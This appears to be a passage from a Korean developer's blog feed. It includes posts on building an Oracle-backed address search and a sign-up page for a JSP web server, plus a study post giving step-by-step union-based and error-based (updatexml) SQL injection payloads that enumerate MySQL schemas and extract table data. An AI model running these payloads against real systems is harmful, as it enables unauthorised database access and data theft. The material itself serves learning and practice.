</ul>]]></content><author><name>Jung MinGyu</name></author><category term="Oracle DB" /><category term="DB" /><category term="sql injection" /><summary type="html"><![CDATA[error based sql injection 을 연습하기 위하여 직접 db 에러를 보여주는 로그인 페이지를 만들었다.]]></summary></entry><entry><title type="html">웹서버 만들기 9 주소검색기능</title><link href="http://localhost:4000/%EC%9B%B9%EC%84%9C%EB%B2%84%EA%B0%9C%EB%B0%9C9%EC%A3%BC%EC%86%8C%EA%B2%80%EC%83%89/" rel="alternate" type="text/html" title="웹서버 만들기 9 주소검색기능" /><published>2023-04-26T00:00:00+09:00</published><updated>2023-04-26T23:13:00+09:00</updated><id>http://localhost:4000/%EC%9B%B9%EC%84%9C%EB%B2%84%EA%B0%9C%EB%B0%9C9%EC%A3%BC%EC%86%8C%EA%B2%80%EC%83%89</id><content type="html" xml:base="http://localhost:4000/%EC%9B%B9%EC%84%9C%EB%B2%84%EA%B0%9C%EB%B0%9C9%EC%A3%BC%EC%86%8C%EA%B2%80%EC%83%89/"><![CDATA[<h1 id="주소-검색-기능">주소 검색 기능</h1>
<ul>
  <li>서버
    <ul>
      <li>오라클 DB 서버 : oracle-database-xe-21c</li>
    </ul>
  </li>
  <li>구조
    <ul>
      <li>우편번호</li>
      <li>주소( 시도 도로명 건물번호본번 건물번호부번 )</li>
      <li>주소2(층수 부가 정보)</li>
    </ul>
  </li>
</ul>

<h2 id="주소찾기-동작과정">주소찾기 동작과정</h2>
<p><img class="mermaid" src="https://mermaid.ink/svg/eyJjb2RlIjoic2VxdWVuY2VEaWFncmFtXG7sgqzsmqnsnpAo67iM65287Jqw7KCAKSAtPj4g7ISc67KEIDog7KO87IaM7LC-6riwIOyalOyyrVxu7ISc67KEIC0-PiBEQiDshJzrsoQgOiDso7zshozrpbwg7J207Jqp7ZWY7JesIOyasO2OuOuyiO2YuCwg7KO87IaMIOyalOyyrVxuREIg7ISc67KELT4-IOyEnOuyhCA6IOyasO2OuOuyiO2YuCwg7KO87IaMIOydkeuLtVxu7ISc67KEIC0-PiDsgqzsmqnsnpAo67iM65287Jqw7KCAKSA6IOyasO2OuOuyiO2YuCwg7KO87IaMIOydkeuLtSIsIm1lcm1haWQiOm51bGx9" /></p>

<h2 id="우편번호-db--다운받기">우편번호 DB  다운받기</h2>
<ul>
  <li><a href="https://www.epost.go.kr/search/zipcode/cmzcd002k01.jsp">우편번호 DB와 검색기</a>에서 다운받는다.</li>
  <li>압축 파일안에는 text 파일들이 들어있다.</li>
  <li><code class="language-plaintext highlighter-rouge">|</code> 의 구분자로 데이터들이 분리되어 있다.</li>
  <li>UTF-8 (BOM) 형태로 포맷 되어있다. 포맷을 UTF-8 로 변경하자.</li>
  <li>우리는 여기서 대구광역시, 경기도 파일을 oracle db 에 Import 할 것이다.</li>
</ul>

<h2 id="sql-developer-231-다운로드">SQL Developer 23.1 다운로드</h2>
<ul>
  <li>Oracle db 서버와 연결하여 보다 쉽게 sql 문들을 사용하기 위한것 이다.</li>
  <li><a href="https://www.oracle.com/database/sqldeveloper/technologies/download/">Oracle SQL Developer Downloads</a></li>
</ul>

<h3 id="오라클-서버와-연결하기">오라클 서버와 연결하기</h3>
<ol>
  <li><strong>Oracle SQL Development</strong> 를 연다.</li>
  <li><code class="language-plaintext highlighter-rouge">Oracle 접속</code> 우클릭 &gt; 새 접속<br /><img src="https://user-images.githubusercontent.com/31990118/234529534-04d39ca0-e749-4e62-9d23-5de70888c85c.png" alt="Pasted image 20230421225802" /></li>
  <li>사용자 이름, 비밀번호, db 서버 호스트 이름을 입력후 테스트를 클릭하여 접속 테스를 한다.</li>
  <li>테스트가 성공하였다면 접속 버튼을 눌러 접속해준다.<br /><img src="https://user-images.githubusercontent.com/31990118/234529679-37b86579-4e45-4e05-9d0d-ba5eb75afdb9.png" alt="Pasted image 20230421225917" /></li>
</ol>

<h3 id="오라클-db에-주소-text-데이터-import-하기">오라클 db에 주소 text 데이터 Import 하기</h3>
<ol>
  <li>테이블 우클릭한다.<br /><img src="https://user-images.githubusercontent.com/31990118/234529812-a7e707be-ebe9-4e12-95b0-184bb31c3f8a.png" alt="Pasted image 20230421230129" /></li>
  <li>데이터 임포트를 클릭한다.<br /><img src="https://user-images.githubusercontent.com/31990118/234529931-49af9420-b874-4bcb-bc56-cb7e4f59c0ac.png" alt="Pasted image 20230421230214" /></li>
  <li>위에서 다운받은 우편번호 db 파일중 하나의 파일을 선택한다. 이때 파일을 <code class="language-plaintext highlighter-rouge">UTF-8</code> 로 포맷되어 있어야 한다.</li>
  <li>다음을 눌러주어 데이터를 임포트해준다. 이 과정에서 처음으로 주소 데이터를 임포트를 한다면 주소 테이블 이름을 정해줘야 한다. 여기서는 테이블 이름을 ‘ko_address’ 라 정해주었다.</li>
  <li>다음 sql 명령을 통해 확인해 보면 내용이 잘 출력되는 것을 알 수 있다.
    <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">select</span> <span class="o">*</span>
<span class="k">from</span> <span class="n">ko_address</span>
<span class="k">where</span> <span class="err">시도</span> <span class="k">like</span> <span class="s1">'%도%'</span><span class="p">;</span>
</code></pre></div>    </div>
    <p><img src="https://user-images.githubusercontent.com/31990118/234530306-b01fb64c-727f-4b37-8d0e-367b37593610.png" alt="Pasted image 20230421230552" /></p>
  </li>
  <li>다른 데이터를 import 할 때는 <code class="language-plaintext highlighter-rouge">ko_address</code>테이블로 데이터를 넣어 주면 된다.</li>
</ol>

<h2 id="ui-부분">UI 부분</h2>
<ul>
  <li>회원가입 페이지에 주소찾기 버튼을 추가하였다.<br /><img src="https://user-images.githubusercontent.com/31990118/234531123-6b2ecb7b-9090-4d73-90bb-8f202aff4817.png" alt="Pasted image 20230426152657" /></li>
  <li>주소찾기 버튼을 누르면 주소 찾기 창이 열린다.<br /><img src="https://user-images.githubusercontent.com/31990118/234531218-a874417b-80be-4f3c-8149-aea64c48eede.png" alt="Pasted image 20230426152712" /></li>
  <li>주소를 입력하고 검색버튼을 클릭하면 서버로 입력한 주소를 요청으로 보내고 응답결과인 우편번호와 주소들을 화면에 보여준다.<br /><img src="https://user-images.githubusercontent.com/31990118/234531305-fe304efe-30db-4feb-936f-92df58f369d0.png" alt="Pasted image 20230426163522" /></li>
  <li>주소를 클릭하여 주면 우편번호와 주소가 회원가입 페이지의 주소 부분에 들어가게 된다.<br /><img src="https://user-images.githubusercontent.com/31990118/234531391-8fab6c8f-9922-446a-a0c8-3957e0631dc5.png" alt="Pasted image 20230426154811" /></li>
</ul>

<h3 id="코드">코드</h3>
<ul>
  <li><code class="language-plaintext highlighter-rouge">sign_up_page.jsp</code> 에 주소검색을 위한 코드를 추가하였다.<br /><script src="https://gist.github.com/MinGyu2/94743489626663324bf55bc9a944782b.js"></script></li>
  <li><code class="language-plaintext highlighter-rouge">/sign_in_page/sign_up_page/find_address_number?address=주소</code> 형태로 서버로 get요청을 보낸다.</li>
  <li>
    <p>서버로부터 응답을 받으면 <code class="language-plaintext highlighter-rouge">\n</code> 로 분리하여 table에 넣어 사용자에게 보여준다.<br /><script src="https://gist.github.com/MinGyu2/6f1c5edd8a3efc93ae0d349e245c605c.js"></script></p>
  </li>
  <li>주소검색창 UI 부분.<br /><script src="https://gist.github.com/MinGyu2/e95aa28a4aded72d65d68c959478611f.js"></script></li>
</ul>

<p><br /><br /></p>

<h2 id="서버부분---db-서버-">서버부분 ( + DB 서버 )</h2>
<ul>
  <li>서버에서 유저가 입력한 주소를 받아 주소에 해당하는 우편번호와 주소를 DB에서 찾아 응답으로 보낸다.</li>
</ul>

<h3 id="코드-1">코드</h3>

<h4 id="dbconnection-class-추가">DBConnection Class 추가</h4>
<ul>
  <li>DB 서버와 연결하기전 사전 준비를 하기위한 클래스이다.</li>
  <li>DBConnection의 <strong>connectDB</strong> 함수를 통해 DB 서버와 연결한다.</li>
</ul>

<script src="https://gist.github.com/MinGyu2/6e74fe516a6df3691df95462f14a2caa.js"></script>

<h4 id="addressdao-class-추가">AddressDAO Class 추가</h4>
<ul>
  <li>DB의 <code class="language-plaintext highlighter-rouge">KO_ADDRESS</code> 테이블에 접근하여 우편번호와 주소를 읽어오기위한 클래스이다.</li>
  <li><strong>getAddressNumber</strong> 함수는 사용자가 입력한 주소를 이용하여 우편번호와 주소를 찾는다. 그리고 우편주소와 주소를 하나의 String으로 만들어 리턴한다.</li>
  <li><strong>getAddressNumber</strong> 함수에서는 테이블에서 최대 50개 까지의 우편번호와 주소를 찾아 리턴할 수 있다.</li>
</ul>

<script src="https://gist.github.com/MinGyu2/0e0ff6366b722575bdfae1214607bd40.js"></script>

<h4 id="login-클래스에-우편번호-uri-부분-추가하기">Login 클래스에 우편번호 uri 부분 추가하기.</h4>
<ul>
  <li>사용자가 주소를 입력하고 서버로부터 우편주소와 주소를 받기위해 get 요청을 한다.</li>
  <li>서버는 <code class="language-plaintext highlighter-rouge">/sign_in_page/sign_up_page/find_address_number</code> uri로 get 요청을 받는다.</li>
</ul>

<script src="https://gist.github.com/MinGyu2/18f3a30443c3ef0f67a9d426f05919ba.js"></script>

<h2 id="회원-가입-할-때-우편번호-및-주소를-추가로-db에-저장하기">회원 가입 할 때 우편번호 및 주소를 추가로 db에 저장하기</h2>
<h3 id="사전-준비">사전 준비</h3>
<ul>
  <li>먼저 우편번호와 주소를 저장하기 위한 컬럼을 만들어줘야 한다.
    <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">alter</span> <span class="k">table</span> <span class="n">users</span> <span class="k">add</span> <span class="err">우편번호</span> <span class="nb">varchar</span><span class="p">(</span><span class="mi">25</span><span class="p">)</span> <span class="k">default</span> <span class="s1">'12428'</span> <span class="k">not</span> <span class="k">null</span><span class="p">;</span>
<span class="k">alter</span> <span class="k">table</span> <span class="n">users</span> <span class="k">add</span> <span class="err">주소</span> <span class="nb">varchar</span><span class="p">(</span><span class="mi">100</span><span class="p">)</span> <span class="k">default</span> <span class="s1">'경기도 가평군 북한강변로 326-138'</span> <span class="k">not</span> <span class="k">null</span><span class="p">;</span>
<span class="k">alter</span> <span class="k">table</span> <span class="n">users</span> <span class="k">add</span> <span class="err">주소</span><span class="mi">2</span> <span class="nb">varchar</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span> <span class="k">default</span> <span class="s1">' '</span> <span class="k">not</span> <span class="k">null</span><span class="p">;</span>
</code></pre></div>    </div>
  </li>
  <li>현재 <code class="language-plaintext highlighter-rouge">USERS</code> 테이블의 컬럼.<br /><img src="https://user-images.githubusercontent.com/31990118/234541935-94eeae91-cce3-4fa2-a686-0220c42f3fe8.png" alt="Pasted image 20230426165757" /></li>
  <li>회원가입할 때 우편번호와 주소를 필요로 한다.</li>
</ul>

<h3 id="클라이언트-수정-부분">클라이언트 수정 부분</h3>

<h4 id="sign_up_pagejsp-부분-수정">sign_up_page.jsp 부분 수정</h4>
<ul>
  <li>회원가입을 하기위하여 우편번호, 주소를 추가하여 서버로 post 요청을 보낸다.</li>
</ul>

<script src="https://gist.github.com/MinGyu2/1c924566aa82beaaa656739e56e2e993.js"></script>

<h3 id="서버-수정-부분">서버 수정 부분</h3>

<h4 id="login-class-의-회원가입-부분-수정">Login class 의 회원가입 부분 수정</h4>
<ul>
  <li>사용자로부터 address_number, address1, address2를 추가적으로 post 요청 받는다.</li>
  <li><strong>SignUp.createUser</strong> 함수의 인자로 주어 회원가입을 진행한다.</li>
</ul>

<script src="https://gist.github.com/MinGyu2/3d75cdc317274ea780a2fccb9d74f1a8.js"></script>

<h4 id="singup-부분-수정">SingUp 부분 수정</h4>
<ul>
  <li>우편번호와 주소 부분을 추가로 받는다.</li>
</ul>

<script src="https://gist.github.com/MinGyu2/f87fa4e9bebf0e81cb2188234ea98c1d.js"></script>

<h4 id="userdao-createuser-함수-부분-수정">UserDAO createUser 함수 부분 수정</h4>
<ul>
  <li>유저 정보 테이블에 주소를 저장하는 부분을 추가한다.</li>
</ul>

<script src="https://gist.github.com/MinGyu2/245cb5a0fbc2d20c5a01dedbea471b9e.js"></script>

<h3 id="동작화면">동작화면</h3>
<ol>
  <li>회원가입 페이지에서 정보를 입력한다.<br /><img src="https://user-images.githubusercontent.com/31990118/234544104-b12395fb-0da9-472b-a1db-2538c8163165.png" alt="Pasted image 20230426172840" /></li>
  <li>주소찾기 버튼을 누르명 주소찾기창이 나온다. 이 창에서 주소를 입력하고 검색 버튼을 눌러준다. <br /><img src="https://user-images.githubusercontent.com/31990118/234544163-bff55a86-4bf3-4599-9136-e46583e8d853.png" alt="Pasted image 20230426173129" /></li>
  <li>맞는 주소를 클릭하면 회원가입의 주소창에 우편번호와 주소가 들어간다.<br /><img src="https://user-images.githubusercontent.com/31990118/234544217-fb54c52f-cf29-4195-9042-be7be09f0edc.png" alt="Pasted image 20230426173238" /></li>
  <li>회원가입 버튼을 클릭하여 준다.<br /><img src="https://user-images.githubusercontent.com/31990118/234544275-5a680719-969e-4a1e-87cb-d2806d207b41.png" alt="Pasted image 20230426173314" /></li>
  <li>새로 생성한 계정으로 로그인해보기.<br /><img src="https://user-images.githubusercontent.com/31990118/234544328-b337f9e6-38eb-4d36-8a72-cd7c1f799214.png" alt="Pasted image 20230426173707" /><br /><img src="https://user-images.githubusercontent.com/31990118/234544361-f2ce717c-fb36-4aca-9a80-03c5afe76445.png" alt="Pasted image 20230426173726" /></li>
  <li><code class="language-plaintext highlighter-rouge">USERS</code> 테이블에 user4 유저 생성됬는지 확인하기.<br /><img src="https://user-images.githubusercontent.com/31990118/234544415-0900aba6-29eb-4dbe-b841-bfb7fe7262ba.png" alt="Pasted image 20230426173901" /></li>
</ol>

<h2 id="참고-사이트">참고 사이트</h2>
<ul>
  <li><a href="https://accessgudid.nlm.nih.gov/resources/developers/importing_delimited_device_files/oracle">Importing Delimited Device Files into an Oracle Database using Oracle SQL Developer</a></li>
  <li><a href="https://deveric.tistory.com/68">주소 데이터의 빠른 조회를 위해 인덱스 설정하기 (tistory.com)</a></li>
  <li><a href="https://www.codingfactory.net/10424">JavaScript / Object / String.split() / 문자열 분할하는 메서드 – CODING FACTORY</a></li>
  <li><a href="https://hogni.tistory.com/122">자바스크립트 childNodes 속성과 children 속성의 차이 (tistory.com)</a></li>
  <li><a href="https://ggmouse.tistory.com/417">JavaScript this 인자 전달 onclick/href (tistory.com)</a></li>
  <li><a href="https://www.w3schools.com/howto/tryit.asp?filename=tryhow_css_login_form_modal">W3Schools Tryit Editor</a></li>
  <li><a href="https://www.epost.go.kr/search.RetrieveIntegrationNewZipCdList.comm">우편번호검색 - 통합검색 우편번호 (epost.go.kr)</a></li>
</ul>]]></content><author><name>Jung MinGyu</name></author><category term="Oracle DB" /><category term="웹서버" /><category term="servlet" /><category term="jsp" /><summary type="html"><![CDATA[주소검색 기능을 만들어보자.]]></summary></entry><entry><title type="html">Union SQLi &amp;amp; Error Based SQLi 과정 정리</title><link href="http://localhost:4000/SQLi%EB%B0%A9%EB%B2%95/" rel="alternate" type="text/html" title="Union SQLi &amp;amp; Error Based SQLi 과정 정리" /><published>2023-04-24T00:00:00+09:00</published><updated>2023-04-30T23:13:00+09:00</updated><id>http://localhost:4000/SQLi%EB%B0%A9%EB%B2%95</id><content type="html" xml:base="http://localhost:4000/SQLi%EB%B0%A9%EB%B2%95/"><![CDATA[<h2 id="환경">환경</h2>
<ul>
  <li>MYSQL 서버</li>
</ul>

<p><br /></p>

<h2 id="union-sqli">Union SQLi</h2>

<h3 id="조건">조건</h3>
<ul>
  <li>질의문 결과가 화면에 보여야 한다.</li>
</ul>

<h3 id="동작-유형">동작 유형</h3>
<ul>
  <li>게시판 ( 글이 화면에 나온다. )</li>
  <li>회원정보 ( 마이페이지 )</li>
  <li>주소검색</li>
  <li>검색 페이지</li>
</ul>

<h3 id="과정">과정</h3>
<ol>
  <li>서버에서 어떤 질의문을 사용하는지 추측하기.
    <ul>
      <li>질의문 추측 = <code class="language-plaintext highlighter-rouge">select xxxx from xxx where 컬럼명 like '%----%' ...</code></li>
    </ul>
  </li>
  <li><strong>SQL Injection</strong> 취약점 존재하는지 확인하기.
    <ul>
      <li>질의문 = <code class="language-plaintext highlighter-rouge">select xxxx from xxx where 컬럼명 like '%test%' and '1%'='1%' ...</code></li>
      <li>입력 = <code class="language-plaintext highlighter-rouge">test%' and '1%'='1</code></li>
    </ul>
  </li>
  <li>컬럼수 찾기.
    <ul>
      <li><code class="language-plaintext highlighter-rouge">order by</code> 를 이용하여 1씩 증가 시키면서 컬럼수를 찾아준다.</li>
      <li>질의문 = <code class="language-plaintext highlighter-rouge">select xxxx from xxx where 컬럼명 like '%test%' order by 1 -- %' ...</code></li>
      <li>입력 = <code class="language-plaintext highlighter-rouge">test%' order by 1 -- </code></li>
    </ul>
  </li>
  <li>data 출력 위치 파악하기.
    <ul>
      <li>위에서 찾은 컬럼수를 이용하여 data 출력 위치 파악하기.</li>
      <li>질의문 = <code class="language-plaintext highlighter-rouge">select xxxx from xxx where 컬럼명 like '%test%' union select '1','2','3','4' from dual -- %' ...</code></li>
      <li>입력 = <code class="language-plaintext highlighter-rouge">test%' union select '1','2','3','4' from dual -- </code></li>
    </ul>
  </li>
  <li>database 이름 출력하기.
    <ul>
      <li>위에서 파악한 출력위치를 이용하여 DB 이름을 알아보자.</li>
      <li><code class="language-plaintext highlighter-rouge">select database() from dual</code> 명령을 이용하면 현재 DB 명이 나온다.</li>
      <li>질의문 = <code class="language-plaintext highlighter-rouge">select xxxx from xxx where 컬럼명 like '%test%' union select '1',database(),'3','4' from dual -- %' ...</code></li>
      <li>입력 = <code class="language-plaintext highlighter-rouge">test%' union select '1',database(),'3','4' from dual -- </code></li>
    </ul>
  </li>
  <li>table 이름 출력하기.
    <ul>
      <li>위에서 파악한 DB이름을 이용하여 존재하는 테이블명을 알아보자.</li>
      <li><code class="language-plaintext highlighter-rouge">select table_name from information_schema.tables where table_schema='DB명'</code> 명령을 이용하면 테이블명을 알 수 있다.</li>
      <li>질의문 = <code class="language-plaintext highlighter-rouge">select xxxx from xxx where 컬럼명 like '%test%' union select '1',table_name,'3','4' from from information_schema.tables where table_schema='DB명' -- %' ...</code></li>
      <li>입력 = <code class="language-plaintext highlighter-rouge">test%' union select '1',table_name,'3','4' from from information_schema.tables where table_schema='DB명' -- </code></li>
    </ul>
  </li>
  <li>column 이름 출력하기.
    <ul>
      <li>위에서 파악한 table 이름을 이용하여 table의 컬럼명을 알아보자.</li>
      <li><code class="language-plaintext highlighter-rouge">select column_name from information_schema.columns where table_name='테이블명'</code> 명령을 이용하면 해당 table의 컬럼명을 알 수 있다.</li>
      <li>질의문 = `select xxxx from xxx where 컬럼명 like ‘%test%’ union select ‘1’,column_name,’3’,’4’ from information_schema.columns where table_name=’테이블명’ – %’ …</li>
      <li>입력 = <code class="language-plaintext highlighter-rouge">test%' union select '1',column_name,'3','4' from information_schema.columns where table_name='테이블명' -- </code></li>
    </ul>
  </li>
  <li>정보 빼오기.
    <ul>
      <li>위에서 파악한 table명과 해당 table에 대한 column 명을 이용하여 정보를 빼오자!</li>
      <li><code class="language-plaintext highlighter-rouge">select column명 from table명</code> 명령을 이용하여 저장된 정보를 알 수 있다.</li>
      <li>질의문 = <code class="language-plaintext highlighter-rouge">select xxxx from xxx where 컬럼명 like '%test%' union select '1',column명,'3','4' from table명 -- %' ...</code></li>
      <li>입력 = <code class="language-plaintext highlighter-rouge">test%' union select '1',column명,'3','4' from table명 -- </code>
<br /><br /></li>
    </ul>
  </li>
</ol>

<p><br /><br /></p>

<h2 id="error-based-sqli">Error Based SQLi</h2>
<ul>
  <li>논리 에러를 의도적으로 일으켜 데이터를 추출하는 공격이다.</li>
</ul>

<h3 id="조건-1">조건</h3>
<ul>
  <li>Error 메세지가 화면에 보여야한다.</li>
</ul>

<h3 id="동작-유형-1">동작 유형</h3>
<ul>
  <li>로그인 페이지</li>
  <li>아이디 중복 체크</li>
</ul>

<h3 id="sql-논리-에러를-발생시킬-수-있는-함수">SQL 논리 에러를 발생시킬 수 있는 함수</h3>
<ul>
  <li>updatexml</li>
  <li>ExtractValue</li>
</ul>

<h3 id="과정-1">과정</h3>
<ol>
  <li>서버에서 어떤 질의문을 사용하는지 추측하기.
    <ul>
      <li>질의문 추측 = <code class="language-plaintext highlighter-rouge">select xxxx from xxx where 컬럼명='----' ...</code></li>
    </ul>
  </li>
  <li>오류 발생 확인하기. ( db 에러인지 확인하기 )
    <ul>
      <li>입력 = <code class="language-plaintext highlighter-rouge">' asd</code></li>
      <li><strong>syntax error 발생(문법 에러)</strong> 가 발생하는 것을 확인이 가능한지 본다.</li>
    </ul>
  </li>
  <li>Error Based SQL Injection Function 동작하는지 확인하기.
    <ul>
      <li>Syntax error (문법에러) : 문법 틀리면 안됨. 컴파일 할 때 잡아낸다.</li>
      <li>논리에러 : 실행이된다.</li>
      <li>즉 우리는 논리에러를 발생시켜야 한다.</li>
      <li><strong>updatexml</strong> 함수를 이용하자!</li>
      <li>질의문 = <code class="language-plaintext highlighter-rouge">select xxxx from xxx where 컬럼명='1' and updatexml(null, concat(0x3a,'test'), null) and '1'='1' ...</code></li>
      <li>입력 = <code class="language-plaintext highlighter-rouge">1' and updatexml(null, concat(0x3a,'test'), null) and '1'='1</code></li>
      <li><code class="language-plaintext highlighter-rouge">XPATH syntax error: ':test'</code> 에러를 볼 수 있다.</li>
      <li><code class="language-plaintext highlighter-rouge">select xxxx from xxx where 컬럼명='1' and updatexml(null, concat(0x3a,(SQL)), null) and '1'='1' ...</code> test 대신 질의문을 넣어주면 된다.</li>
    </ul>
  </li>
  <li>Database 이름 출력하기.
    <ul>
      <li><code class="language-plaintext highlighter-rouge">select database() from dual</code>  로 DB 명 찾기</li>
      <li>질의문 = <code class="language-plaintext highlighter-rouge">select xxxx from xxx where 컬럼명='1' and updatexml(null, concat(0x3a,(select database() from dual)), null) and '1'='1' ...</code></li>
      <li>입력 = <code class="language-plaintext highlighter-rouge">1' and updatexml(null, concat(0x3a,(select database() from dual)), null) and '1'='1</code></li>
    </ul>
  </li>
  <li>table 이름 출력하기.
    <ul>
      <li><code class="language-plaintext highlighter-rouge">select table_name from information_schema.tables where table_schema='DB명' limit 0,1</code> 로 table 명 찾기.</li>
      <li>오류는 하나의 데이터만 보여줄 수 있다. 따라서 출력을 1개로 제한하였다.</li>
      <li>질의문 = <code class="language-plaintext highlighter-rouge">select xxxx from xxx where 컬럼명='1' and updatexml(null, concat(0x3a,(select table_name from information_schema.tables where table_schema='DB명' limit 0,1)), null) and '1'='1' ...</code></li>
      <li>입력 = <code class="language-plaintext highlighter-rouge">1' and updatexml(null, concat(0x3a,(select table_name from information_schema.tables where table_schema='DB명' limit 0,1)), null) and '1'='1</code></li>
      <li><code class="language-plaintext highlighter-rouge">limit</code> 를 조절하면서 원하는 테이블명을 찾는다.</li>
    </ul>
  </li>
  <li>column 이름 출력하기.
    <ul>
      <li><code class="language-plaintext highlighter-rouge">select column_name from information_schema.columns where table_name='테이블명' limit 0,1</code> 로 table에 해당하는 column명 찾기.</li>
      <li>질의문 = <code class="language-plaintext highlighter-rouge">select xxxx from xxx where 컬럼명='1' and updatexml(null, concat(0x3a,(select column_name from information_schema.columns where table_name='테이블명' limit 0,1)), null) and '1'='1' ...</code></li>
      <li>입력 = <code class="language-plaintext highlighter-rouge">1' and updatexml(null, concat(0x3a,(select column_name from information_schema.columns where table_name='테이블명' limit 0,1)), null) and '1'='1</code></li>
    </ul>
  </li>
  <li>정보 빼오기
    <ul>
      <li>위에서 파악한 table명과 해당 table에 대한 column 명을 이용하여 정보를 빼오자!</li>
      <li><code class="language-plaintext highlighter-rouge">select column명 from table명 limit 0,1</code> 명령을 이용하여 저장된 정보를 알 수 있다.</li>
      <li>질의문 = <code class="language-plaintext highlighter-rouge">select xxxx from xxx where 컬럼명='1' and updatexml(null, concat(0x3a,(select column명 from table명 limit 0,1)), null) and '1'='1' ...</code></li>
      <li>입력 = <code class="language-plaintext highlighter-rouge">1' and updatexml(null, concat(0x3a,(select column명 from table명 limit 0,1)), null) and '1'='1</code></li>
    </ul>
  </li>
</ol>]]></content><author><name>Jung MinGyu</name></author><category term="Mysql" /><category term="DB" /><category term="sql injection" /><summary type="html"><![CDATA[sql injection 보다 쉽게 할 수 있는 과정을 정리하였다.]]></summary></entry><entry><title type="html">웹 서버 만들기 (8) 회원가입 구현</title><link href="http://localhost:4000/%EC%9B%B9%EC%84%9C%EB%B2%84%EA%B0%9C%EB%B0%9C8/" rel="alternate" type="text/html" title="웹 서버 만들기 (8) 회원가입 구현" /><published>2023-04-20T00:00:00+09:00</published><updated>2023-04-20T23:13:00+09:00</updated><id>http://localhost:4000/%EC%9B%B9%EC%84%9C%EB%B2%84%EA%B0%9C%EB%B0%9C8</id><content type="html" xml:base="http://localhost:4000/%EC%9B%B9%EC%84%9C%EB%B2%84%EA%B0%9C%EB%B0%9C8/"><![CDATA[<h2 id="회원-가입-버튼-누르기-전">회원 가입 버튼 누르기 전</h2>

<p><br /></p>
<h3 id="회원가입-버튼-추가">회원가입 버튼 추가</h3>
<hr />
<blockquote>
  <p><strong>로그인 페이지에 회원가입 버튼 추가</strong><br /><img src="https://user-images.githubusercontent.com/31990118/233329577-363a25da-eafd-46a5-8eb1-0d83f5d75943.png" alt="Pasted image 20230420151719" /></p>
</blockquote>

<blockquote>
  <p><strong>회원가입 버튼 부분(클라이언트)</strong><br /><script src="https://gist.github.com/MinGyu2/e0ee562997986b0cc8fd8d4c1cd4433a.js"></script></p>
  <ul>
    <li>회원 가입 페이지로 연결해준다.</li>
  </ul>
</blockquote>

<blockquote>
  <p><strong>회원가입 페이지 연결(서버)</strong></p>
  <div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nc">String</span> <span class="n">formAction</span> <span class="o">=</span> <span class="s">"/sign_in_page/authentication"</span><span class="o">;</span>
<span class="n">request</span><span class="o">.</span><span class="na">setAttribute</span><span class="o">(</span><span class="s">"formAction"</span><span class="o">,</span> <span class="n">formAction</span><span class="o">);</span>
<span class="n">request</span><span class="o">.</span><span class="na">setAttribute</span><span class="o">(</span><span class="s">"signUpLink"</span><span class="o">,</span> <span class="s">"/sign_in_page/sign_up_page"</span><span class="o">);</span>
<span class="c1">// session id 가 만료되었거나 없어서 새롭게 로그인 해 줘야한다.</span>
<span class="c1">// 로그인 페이지를 보여준다.</span>
<span class="n">gotoForwardPage</span><span class="o">(</span><span class="n">request</span><span class="o">,</span> <span class="n">response</span><span class="o">,</span> <span class="s">"/WEB-INF/sign_in_page/sign_in_page.jsp"</span><span class="o">);</span>
</code></pre></div>  </div>
  <ul>
    <li>서버에서 <code class="language-plaintext highlighter-rouge">signUpLink</code> 변수를 넣은후 <code class="language-plaintext highlighter-rouge">sign_in_page.jsp</code> 로 forward 해야지만 회원가입 링크 부분이 완성이 된다.</li>
    <li>만약 signUpLink 변수를 안주면 회원가입 버튼이 안보인다.<br /><img src="https://user-images.githubusercontent.com/31990118/233330281-cb605b66-ab9a-4335-bd36-b76aea157fde.png" alt="Pasted image 20230420153007" /></li>
  </ul>
</blockquote>

<p><br /></p>
<h3 id="회원가입-페이지">회원가입 페이지</h3>
<hr />
<blockquote>
  <p>회원가입 페이지<br /><img src="https://user-images.githubusercontent.com/31990118/233330449-37b9eb7a-5c2e-424c-a505-158e2ea7230c.png" alt="Pasted image 20230420153118" /></p>
</blockquote>

<blockquote>
  <p>구성</p>
  <ul>
    <li><code class="language-plaintext highlighter-rouge">Username</code>
      <ul>
        <li>유저 아이디를 입력한다.</li>
      </ul>
    </li>
    <li><code class="language-plaintext highlighter-rouge">중복확인</code>
      <ul>
        <li>서버로 유저가 입력한 아이디를 보내 중복하는 아이디인지 확인한다.</li>
      </ul>
    </li>
    <li><code class="language-plaintext highlighter-rouge">Email</code>
      <ul>
        <li>유저 이메일을 입력한다.</li>
        <li>이메일 패턴에 맞게 입력하여야 한다.</li>
      </ul>
    </li>
    <li><code class="language-plaintext highlighter-rouge">Password</code>
      <ul>
        <li>유저 비밀번호를 입력한다.</li>
      </ul>
    </li>
    <li><code class="language-plaintext highlighter-rouge">Password 확인</code>
      <ul>
        <li>유저 비밀번호를 동일하게 입력한다.</li>
      </ul>
    </li>
    <li><code class="language-plaintext highlighter-rouge">회원가입</code>
      <ul>
        <li>중복확인, 이메일 패턴 일치 여부, 비밀번호 일치 여부를 확인한 후 각각 입력한 데이터를 서버로 전송한다.</li>
      </ul>
    </li>
  </ul>
</blockquote>

<p><br /></p>
<h3 id="아이디-중복-확인">아이디 중복 확인</h3>
<hr />

<blockquote>
  <p><strong>유저 아이디 중복 확인 (클라이언트)</strong><br /><script src="https://gist.github.com/MinGyu2/05f9fea7bbc9fab773e3fa6ce86fa623.js"></script></p>
  <ul>
    <li>중복확인 버튼을 누르면 <code class="language-plaintext highlighter-rouge">Http get</code> 요청을 통해 <code class="language-plaintext highlighter-rouge">username</code>에 사용자가 입력한 id를 넣어 중복확인 서버 주소를 이용하여 보낸다.</li>
    <li>서버에서 보내온 응답을 통해 아이디가 중복하는지 확인한다.<br /><img src="https://user-images.githubusercontent.com/31990118/233331834-0ad61a19-546a-418d-a474-c6fce7c81f2f.png" alt="Pasted image 20230420155201" /><br /><img src="https://user-images.githubusercontent.com/31990118/233331879-4bf2dff8-c9e8-4d3c-98b8-03ab84536a4a.png" alt="Pasted image 20230420155213" /></li>
  </ul>
</blockquote>

<blockquote>
  <p><strong>유저 아이디 중복 확인 (서버)</strong><br /><script src="https://gist.github.com/MinGyu2/98d645f481a935817b22cbeb249f7e08.js"></script></p>
  <ul>
    <li>클라이언트에서 보낸 <code class="language-plaintext highlighter-rouge">username</code>을 확인해 볼 수 있다.</li>
